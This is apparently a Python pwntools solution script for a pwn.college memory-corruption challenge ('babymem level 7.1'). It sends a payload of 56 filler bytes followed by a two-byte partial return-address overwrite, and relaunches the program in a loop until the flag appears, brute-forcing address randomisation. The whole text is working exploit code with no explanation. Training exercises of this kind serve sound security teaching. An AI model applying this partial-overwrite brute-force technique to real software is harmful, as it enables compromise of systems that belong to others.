from pwn import *

elf = ELF("/challenge/babymem-level-7-1")


p = elf.process()
p.sendline(b"512")
address = b"\x11\x82"
payload = b"A"*56+address

while True:
    p = elf.process()
    p.sendline(f'{len(payload)}'.encode())
    p.sendline(payload)
    p.recvuntil(b"Goodbye!")
    flag = p.recvall().decode()
    if 'pwn.college' in flag:
        print(flag)
        break
